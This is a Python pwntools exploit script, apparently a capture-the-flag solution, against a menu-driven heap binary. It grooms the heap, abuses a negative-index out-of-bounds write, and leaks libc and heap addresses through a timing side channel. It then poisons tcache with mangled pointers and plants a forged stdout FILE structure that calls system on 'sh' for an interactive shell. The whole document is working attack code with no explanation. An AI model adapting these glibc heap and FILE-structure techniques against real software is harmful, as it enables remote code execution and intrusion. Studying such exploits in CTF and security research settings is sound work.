#!/usr/bin/env python3
from pwn import *
from tqdm import *

exe  = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path) if exe.libc else None

def create(ts, desc=b'A'*0x10):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b': ', str(ts).encode())
    io.sendafter(b': ', desc.ljust(16, b'\x00')[:16])

def add_tag(ts, tag=b'A'*0x10):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b': ', str(ts).encode())
    io.sendafter(b': ', tag.ljust(16, b'\x00')[:16])

def edit_tag(ts, idx, tag=b'A'*0x10):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b': ', str(ts).encode())
    io.sendlineafter(b': ', str(idx).encode())
    io.sendafter(b': ', tag.ljust(16, b'\x00')[:16])

def delete(ts):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b': ', str(ts).encode())

def measure(val):
    d = []
    for _ in range(8):
        create(val)
        t = time.time()
        io.recvuntil(b'> ')
        d.append(time.time()-t)
        io.sendline(b'5')
        delete(val)
    return sum(d)/len(d)

def bsearch():
    d1 = measure(0)
    d2 = measure((2**48)-1)
    assert d2*4 < d1
    lo = 0 ; hi = 2**48
    while lo&~0xfff != hi&~0xfff:
        mid = (lo+hi)//2
        d = measure(mid)
        if d*4 < d1: hi = mid-1
        else: lo = mid+1
    return lo&~0xfff

io = remote('localhost', 1337)

for b in [0x8181, 0x4141, 0x2121]:
    create(b)
    for _ in range(16): add_tag(b)
    create(b+1)
    add_tag(b)
    for i in range(12): create(b+2+i)
    for _ in range(28): add_tag(b+12)

for i in trange(0x80000):
    io.send(b'1'+b'\n' + str(0x41414141+i).encode()+b'\n' + p64(0)*2)
    if i % 0x800 == 0 and i != 0: io.clean()

io.sendline(b'5')
io.recvuntil(b':)\n')

for i in range(3): create(0x21212121+i)
for _ in range(97): add_tag(0x21212121)
for _ in range(64): add_tag(0x21212122)
for _ in range(32): add_tag(0x21212123)

delete(0x8181+12) ; create(0x8181+14)
for _ in range(28): add_tag(0x41414141)

for b in [0x2121, 0x4141, 0x8181]: edit_tag(b, -(2**31), p64(0x450|1))

delete(0x2122)
delete(0x8182)
delete(0x4142)

edit_tag(0x41414141, -(2**31), p64(0))

for _ in range(17): add_tag(0x41414151)
for i in range(10): create(0x8181+i)
for i in range(4): add_tag(0x41414171+i)
for i in range(2): delete(0x41414171+i)

for _ in range(17): add_tag(0x41414181)
edit_tag(0x41414141, -(2**31), p64(0))

create(0x41414171)
libc.address = bsearch()-0x208000
log.success(f'{libc.address = :#x}')
create(0x41414172)

for i in range(2+22): add_tag(0x414141a1+i)
for i in range(2): delete(0x414141a1+i)
for _ in range(17): add_tag(0x414141c1)

create(0x414141a1)
heap_base = bsearch()-0x14000
log.success(f'{heap_base = :#x}')
create(0x414141a2)

fs = flat({
  0x00: b"A;sh",
  0x28: p64(1),
  0x68: libc.sym.system,
  0x88: heap_base+0x2015740,
  0xa0: libc.sym._IO_2_1_stdout_-0x10,
  0xd0: libc.sym._IO_2_1_stdout_,
  0xd8: libc.sym._IO_wfile_jumps-0x20,
}, filler=b'\x00').ljust(33*8, b'\x00')

delete(0x21212122)
edit_tag(0x21212121, -(2**31), p64(libc.sym._IO_2_1_stdout_^((heap_base+0x2015740)>>12)))

for i in range(33): add_tag(0x414141e1, p64(0)*2)
for i in range(len(fs)//8): add_tag(0x414141e2, fs[i*8:][:8])

io.interactive()
